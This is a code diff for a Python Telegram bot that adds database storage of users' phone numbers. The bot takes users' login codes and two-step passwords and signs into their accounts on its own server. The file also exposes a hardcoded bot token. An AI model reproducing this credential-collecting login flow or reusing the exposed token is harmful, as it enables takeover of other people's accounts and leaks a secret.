@@ -5,7 +5,7 @@ import asyncio
 from aiohttp import web
 from telethon import TelegramClient, events
 from telethon.errors import SessionPasswordNeededError
-from database import init_db
+from database import init_db, add_user_number, get_user_numbers
 from keyboards import get_main_keyboard, get_admin_panel_keyboard, get_back_keyboard
 
 logging.basicConfig(level=logging.INFO)
@@ -18,10 +18,9 @@ BOT_TOKEN = '8545427199:AAG5hZC0DypVhE8xFuwOOEWrqwuirh_hutc'
 ADMIN_ID = 1251313339
 # ==========================================================
 
-# قاموس لتتبع حالة المستخدمين (للأرقام وكلمات المرور)
 user_states = {}
 
-# سيرفر الويب لإبقاء البوت نشطاً على Render
+# سيرفر الويب لضمان بقاء البوت نشطاً على Render
 async def handle(request):
     return web.Response(text="Zack-Bot is running successfully!")
 
@@ -94,7 +93,14 @@ async def callback_handler(event):
 
     elif data == "my_numbers":
         await event.answer()
-        await event.edit("📱 **أرقامك المسجلة:**\nلا توجد أرقام مسجلة حالياً باسمك. استخدم زر 'إضافة رقم'.", buttons=get_back_keyboard())
+        numbers = get_user_numbers(user_id)
+        if numbers:
+            numbers_list = "\n".join([f"📱 `{num}`" for num in numbers])
+            text = f"📱 **أرقامك المسجلة حالياً:**\n\n{numbers_list}"
+        else:
+            text = "📱 **أرقامك المسجلة:**\nلا توجد أرقام مسجلة حالياً باسمك. استخدم زر 'إضافة رقم'."
+            
+        await event.edit(text, buttons=get_back_keyboard())
     
     elif data == "add_number":
         await event.answer()
@@ -169,7 +175,7 @@ async def callback_handler(event):
     else:
         await event.answer("عذراً، هذا الزر قيد البرمجة حالياً", alert=True)
 
-# --- معالجة إدخال النصوص (الأرقام، الأكواد، كلمات المرور) ---
+# --- معالجة إدخال النصوص وحفظ الرقم في قاعدة البيانات عند النجاح ---
 @client.on(events.NewMessage(incoming=True))
 async def handle_user_messages(event):
     if event.is_private and not event.raw_text.startswith('/'):
@@ -208,7 +214,11 @@ async def handle_user_messages(event):
             
             try:
                 await temp_client.sign_in(phone=phone, code=code, phone_code_hash=phone_code_hash)
-                await event.respond("🎉 **تم تسجيل الدخول وحفظ الجلسة بنجاح وخاصة بك وحدك! ✅**")
+                
+                # حفظ الرقم في قاعدة البيانات فوراً عند النجاح
+                add_user_number(user_id, phone)
+                
+                await event.respond("🎉 **تم تسجيل الدخول وحفظ الجلسة والرقم بنجاح وخاصة بك وحدك! ✅**")
                 user_states.pop(user_id, None)
             except SessionPasswordNeededError:
                 user_states[user_id]["action"] = "waiting_for_password"
@@ -221,10 +231,15 @@ async def handle_user_messages(event):
             password = text
             state = user_states[user_id]
             temp_client = state["temp_client"]
+            phone = state["phone"]
             
             try:
                 await temp_client.sign_in(password=password)
-                await event.respond("🎉 **تم تسجيل الدخول بنجاح تام وتفعيل الحساب! 🔒**")
+                
+                # حفظ الرقم في قاعدة البيانات أيضاً عند تخطي التحقق بخطوتين
+                add_user_number(user_id, phone)
+                
+                await event.respond("🎉 **تم تسجيل الدخول بنجاح تام وتفعيل الحساب وحفظه! 🔒**")
                 user_states.pop(user_id, None)
             except Exception as e:
                 await event.respond(f"❌ كلمة المرور غير صحيحة: `{str(e)}`")
@@ -232,7 +247,7 @@ async def handle_user_messages(event):
 async def main():
     await start_web_server()
     await client.start(bot_token=BOT_TOKEN)
-    logging.info("Zack-Bot started successfully with all components intact.")
+    logging.info("Zack-Bot started successfully with database saving enabled.")
     await client.run_until_disconnected()
 
 if __name__ == "__main__":
